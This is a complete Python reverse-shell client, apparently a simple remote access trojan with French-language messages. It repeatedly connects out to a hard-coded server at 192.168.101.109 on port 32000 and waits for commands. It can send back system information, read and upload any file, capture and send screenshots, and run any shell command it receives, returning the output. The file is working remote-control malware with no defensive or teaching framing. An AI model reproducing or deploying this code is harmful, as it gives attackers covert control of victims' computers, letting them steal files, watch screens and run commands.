import os  # Module for interacting with the operating system
import socket  # Module for creating network connections
import time  # Module for handling time-related tasks
import subprocess  # Module for running subprocesses
import platform  # Module for getting system information
from PIL import ImageGrab  # Module for capturing screen images

# Server IP and port configuration
HOST_IP = "192.168.101.109"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024  # Maximum data size for receiving commands

# Connecting to the server
print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()  # Creating a socket object
        s.connect((HOST_IP, HOST_PORT))  # Attempting to connect to the server
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)  # Wait for 4 seconds before retrying
    else:
        print("Connecté au serveur")
        break

# Listening for commands from the server
while True:
    commande = s.recv(MAX_DATA_SIZE)  # Receiving command from server
    if not commande:
        break
    commande = commande.decode()  # Decoding the received command
    commande_split = commande.split(" ")

    if commande == "infos":  # Command to get system information and current working directory
        reponse = platform.platform() + " " + os.getcwd()
        reponse = reponse.encode()

    elif len(commande_split) == 2 and commande_split[0] == "cd":  # Command to change directory
        try:
            os.chdir(commande_split[1])
            reponse = " "
        except FileNotFoundError:
            reponse = "ERREUR : ce répertoire n'existe pas"
        reponse = reponse.encode()

    elif len(commande_split) == 2 and commande_split[0] == "dl":  # Command to download a file
        try:
            f = open(commande_split[1], "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()

    elif len(commande_split) == 2 and commande_split[0] == "capture":  # Command to capture the screen
        capture_ecran = ImageGrab.grab()
        capture_file_name = commande_split[1] + ".png"
        capture_ecran.save(capture_file_name, "PNG")
        try:
            f = open(capture_file_name, "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()

    else:  # Any other command to be executed on the shell
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        if not reponse or len(reponse) == 0:
            reponse = " "
        reponse = reponse.encode()

    # Sending the response back to the server
    data_len = len(reponse)
    header = str(data_len).zfill(13)
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(reponse)

s.close()  # Closing the socket connection
